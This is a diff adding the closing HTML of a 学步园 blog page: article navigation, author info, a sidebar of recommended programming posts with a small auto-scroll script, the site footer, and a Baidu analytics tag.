+
+
+</td>
+</tr>
+</table>
+			<div class="clear"></div>
+		</div>
+	<i class="lt"></i>
+	<i class="rt"></i>
+</div>
+<div class="entry_box_b">
+	<i class="lb"></i>
+	<i class="rb"></i>
+</div>
+		<!-- ad -->
+						
+		<div class="context_b">
+			【上篇】<a href="https://www.xuebuyuan.com/2101078.html" rel="prev">C语言指针5分钟教程</a><br/>【下篇】<a href="https://www.xuebuyuan.com/2101149.html" rel="next">在textarea里面插入图片，修改字体大小和颜色（文本富编辑）</a>			<i class="lt"></i>
+			<i class="rt"></i>
+			<i class="lb"></i>
+			<i class="rb"></i>
+		</div>
+		<!-- relatedposts -->
+								<!-- end: relatedposts -->
+		<!-- entrymeta -->
+
+		<div class="entrymeta">
+			<div class="authorbio">
+				<div class="author_pic">
+<!--
+					<img alt='' src='http://1.gravatar.com/avatar/bfa080b0c0fade96b28512d8490063f9?s=48&amp;d=wavatar&amp;r=G' class='avatar avatar-48 photo' height='48' width='48' />-->
+				</div>
+				<div class="clear"></div>
+				<div class="author_text">
+					<h4>作者: <span><a href="https://www.xuebuyuan.com/author/falsely" title="由falsely发布" rel="author">falsely</a></span></h4>
+				</div>
+			</div>
+			<span class="spostinfo">
+				<ul>
+					<li>该日志由 falsely 于4年前发表在综合分类下，最后更新于 2014年09月05日.</li>
+					<li>转载请注明: <a href="https://www.xuebuyuan.com/2101083.html" rel="bookmark" title="本文固定链接 https://www.xuebuyuan.com/2101083.html">Ubuntu 的关机重启与注销 | 学步园</a><a href="#" onclick="copy_code('https://www.xuebuyuan.com/2101083.html'); return false;"> +复制链接</a></li>
+					<li class="content_tag"></li>
+				</ul>
+			</span>
+			<i class="lt"></i>
+			<i class="rt"></i>
+			<div class="clear"></div>
+		</div>
+		<div class="entry_sb">
+			<i class="lb"></i>
+			<i class="rb"></i>
+		</div>
+		<!-- end: entrymeta -->
+	<div class="ct"></div>
+	<!-- You can start editing here. -->
+			<!-- If comments are closed. -->
+		<p class="nocomments">抱歉!评论已关闭.</p>
+							</div>
+<!-- end: content -->
+<div id="sidebar">
+	
+						
+		<div class="widget">
+					</div>
+		<div class="widget">
+		<h3>本站推荐</h3>
+<div class="box">
+	<div class="scat_img"></div>
+	<div id="scat">
+				<ul>
+			<li><a href="https://www.xuebuyuan.com/2201282.html" rel="bookmark" title="详细阅读作业的提交和监控（二）">作业的提交和监控（二）</a></li>
+		</ul>
+				<ul>
+			<li><a href="https://www.xuebuyuan.com/2201280.html" rel="bookmark" title="详细阅读作业的提交和监控（一）">作业的提交和监控（一）</a></li>
+		</ul>
+				<ul>
+			<li><a href="https://www.xuebuyuan.com/2198208.html" rel="bookmark" title="详细阅读Electric-fence 介绍">Electric-fence 介绍</a></li>
+		</ul>
+				<ul>
+			<li><a href="https://www.xuebuyuan.com/2198206.html" rel="bookmark" title="详细阅读原子操作浅谈">原子操作浅谈</a></li>
+		</ul>
+				<ul>
+			<li><a href="https://www.xuebuyuan.com/2198205.html" rel="bookmark" title="详细阅读C++模板显式实例化">C++模板显式实例化</a></li>
+		</ul>
+				<ul>
+			<li><a href="https://www.xuebuyuan.com/2198204.html" rel="bookmark" title="详细阅读Hadoop Local 模式运行 Pipes 程序">Hadoop Local 模式运行 Pipes 程</a></li>
+		</ul>
+				<ul>
+			<li><a href="https://www.xuebuyuan.com/2198202.html" rel="bookmark" title="详细阅读Hadoop I/O 上 SequenceFile 类在 Pipes 上的应用">Hadoop I/O 上 SequenceFile 类</a></li>
+		</ul>
+				<ul>
+			<li><a href="https://www.xuebuyuan.com/2198273.html" rel="bookmark" title="详细阅读Boost &#8211; Function 分析">Boost &#8211; Function 分析</a></li>
+		</ul>
+			</div>
+	<div class="clear"></div>
+</div>
+<div class="box-bottom">
+	<i class="lb"></i>
+	<i class="rb"></i>
+</div>
+<script type="text/javascript">
+var c,_=Function;
+with(o=document.getElementById("scat")){ innerHTML+=innerHTML; onmouseover=_("c=1"); onmouseout=_("c=0");}
+(F=_("if(#%26||!c)#++,#%=o.scrollHeight>>1;setTimeout(F,#%26?10:3500);".replace(/#/g,"o.scrollTop")))();
+</script>	</div>
+
+	
+	
+			
+	<div class="widget">
+			</div>
+
+		<div class="widget">
+					</div>
+	
+				<div class="clear"></div>
+
+			</div><div class="clear"></div>
+<div class="footer_top">
+	<div id="menu">
+		<div class="menu-%e5%af%bc%e8%88%aa-container"><ul id="menu-%e5%af%bc%e8%88%aa-1" class="menu"><li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1703978"><a href="https://www.xuebuyuan.com/category/web%e5%89%8d%e7%ab%af">web前端</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1703980"><a href="https://www.xuebuyuan.com/category/%e6%95%b0%e6%8d%ae%e5%ba%93">数据库</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1703982"><a href="https://www.xuebuyuan.com/category/%e7%bc%96%e7%a8%8b%e8%af%ad%e8%a8%80">编程语言</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1703979"><a href="https://www.xuebuyuan.com/category/%e6%90%9c%e7%b4%a2%e6%8a%80%e6%9c%af">搜索技术</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1810308"><a href="https://www.xuebuyuan.com/aboutus">关于本站</a></li>
+</ul></div>	</div>
+	<h2 class="blogtitle">
+	<a href="https://www.xuebuyuan.com/" title="学步园">返回首页</a></h2>
+		<big class="lt"></big>
+	<big class="rt"></big>
+</div>
+<!-- 页脚 -->
+<div class="footer_bottom_a">
+	Copyright &copy; 2013-2018 学步园&nbsp;&nbsp;保留所有权利.
+		<big class="lb"></big>
+	<big class="rb"></big>
+</div>
+<!-- 首页页脚 -->
+ <div class="clear"></div>
+</div>
+
+
+<!-- Powered by WPtouch: 4.3.18 --></body></html>
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3Fc0f0742eeb83d6ab6614a81723b00197' type='text/javascript'%3E%3C/script%3E"));
+</script>
